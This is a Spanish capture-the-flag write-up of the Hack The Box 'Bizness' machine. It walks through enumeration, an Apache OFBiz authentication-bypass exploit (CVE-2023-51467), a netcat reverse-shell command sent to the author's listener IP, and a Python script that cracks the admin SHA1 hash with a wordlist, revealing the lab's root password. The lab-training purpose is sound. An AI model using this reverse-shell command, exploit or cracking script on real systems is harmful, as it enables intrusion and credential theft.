---
title: "Bizness - WriteUp"
date: Fri Jan 10 2025 14:45:00 GMT+0100 (Central European Standard Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, dirb, reverse-shell, cve, exploit, wfuzz, nginx, apache]
image: /assets/img/htb-writeups/Pasted image 20240112103540.png
---

{% include machine-info.html
  machine="Bizness"
  os="Linux"
  difficulty="Easy"
  platform="HTB"
%}

![Bizness](/assets/img/htb-writeups/Pasted image 20240112103540.png)

-------

Máquina Linux
Dificultad Fácil

-------

NMAP

```bash
# Nmap 7.94SVN scan initiated Fri Jan 12 10:07:30 2024 as: nmap -sCV -p 22,80,443,41213 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.17.168
Nmap scan report for 10.129.17.168
Host is up (0.046s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  ssl/http   nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
41213/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Añadimos host _bizness.htb_

WHATWEB:
```http
$ whatweb http://10.129.17.168

http://10.129.17.168 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.129.17.168], RedirectLocation[https://bizness.htb/], Title[301 Moved Permanently], nginx[1.18.0]

https://bizness.htb/ [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], Email[info@bizness.htb], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[JSESSIONID], IP[10.129.17.168], JQuery, Lightbox, Script, Title[BizNess Incorporated], nginx[1.18.0]
```

HTTP
![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112103540.png)

FUZZING

Se ajusta _wfuzz_ para que no muestre los resultados de redirecciones 302 y texto que no aporta nada.

```bash
$ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,302 --hh 27200 -t 100 'https://bizness.htb/FUZZ'
```

```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload
000002332:   200        491 L    1596 W     34632 Ch    'control'   
```

Descubrimos la ruta "control". Vamos al navegador y vemos esto:

![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112104617.png)

Investigamos sobre _Apache OFBiz_ y descubrimos una vulnerabilidad reciente SSRF, la _CVE-2023-51467_.

Más info sobre la vulnerabilidad: https://nvd.nist.gov/vuln/detail/CVE-2023-51467

Buscamos un exploit o PoC en GitHub y encontramos este:
https://github.com/K3ysTr0K3R/CVE-2023-51467-EXPLOIT

Nos lo bajamos y lo ejecutamos:

![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112105826.png)

Parece que es vulnerable a este exploit. Vamos a ver cómo le podemos sacar más provecho.

Gracias al exploit encontramos la ruta siguiente:

```http
https://bizness.htb/webtools/control/main
```

Que nos lleva a la siguiente página:

![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112110049.png)

Le damos a "Login" y nos lleva a la siguiente URL:

```http
https://bizness.htb/webtools/control/checkLogin
```

![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112110211.png)

Encontramos este otro exploit que permite la ejecución remota de comandos:
https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass

![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112112610.png)

Nos ponemos en escucha en el puerto 443 con _nc_ y ejecutamos el exploit con una reverse shell simple de NetCat:

```bash
$ python3 exploit.py --url https://bizness.htb --cmd 'nc -c sh 10.10.14.40 443'
```

![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112112650.png)

Y pa dentro!
Sanitizamos terminal para volverla full interactiva y comenzamos a enumerar.

![BIZNESS](/assets/img/htb-writeups/Pasted image 20240112113035.png)

Buscando entre unos archivos .dat en la ruta "_/opt/ofbiz/runtime/data/derby/ofbiz/seg0_" encontramos la siguiente línea:

```bash
$ strings *.dat | grep -i "SHA"
```

```xml
<eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
```

Abajo el código para descifrar el hash SHA y nos devuelva el password en texto plano:

```python
import hashlib  
import base64  
import os  
def cryptBytes(hash_type, salt, value):  
    if not hash_type:  
        hash_type = "SHA"  
    if not salt:  
        salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')  
    hash_obj = hashlib.new(hash_type)  
    hash_obj.update(salt.encode('utf-8'))  
    hash_obj.update(value)  
    hashed_bytes = hash_obj.digest()  
    result = f"${hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"  
    return result  
def getCryptedBytes(hash_type, salt, value):  
    try:  
        hash_obj = hashlib.new(hash_type)  
        hash_obj.update(salt.encode('utf-8'))  
        hash_obj.update(value)  
        hashed_bytes = hash_obj.digest()  
        return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')  
    except hashlib.NoSuchAlgorithmException as e:  
        raise Exception(f"Error while computing hash of type {hash_type}: {e}")  
hash_type = "SHA1"  
salt = "d"  
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="  
wordlist = '/usr/share/wordlists/rockyou.txt'  
with open(wordlist,'r',encoding='latin-1') as password_list:  
    for password in password_list:  
        value = password.strip()  
        hashed_password = cryptBytes(hash_type, salt, value.encode('utf-8'))  
        # print(hashed_password)  
        if hashed_password == search:  
            print(f'Found Password:{value}, hash:{hashed_password}')
```

Y nos devuelve la contraseña de root:

```mysql
Found Password:monkeybizness, hash:$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=
```

También es la contraseña del panel de administración de Apache OFBiz. Usuario _admin_.

Entramos como root y reto conseguido!
---

**Última actualización**: 2025-01-10<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
